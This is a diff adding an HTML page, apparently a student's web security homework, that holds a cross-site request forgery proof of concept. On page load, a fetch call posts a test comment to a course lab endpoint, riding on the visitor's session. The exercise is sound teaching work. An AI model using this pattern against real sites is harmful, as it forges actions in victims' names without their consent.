@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Homework 3 | COUZI Rémi | Q1</title>
+</head>
+<body>
+    <h2>Homework 3 | COUZI Rémi | Q1</h2>
+    <p>CSRF Exploit with Fetch API</p>
+    <script>
+        const url = "https://webappsec.cs.ut.ee/csrf/comments.php";
+
+        const commentToAdd = "FinalTestCouzi"
+
+        fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded'
+            },
+            body: "comment="+commentToAdd
+        });
+    </script>
+</body>
+</html>
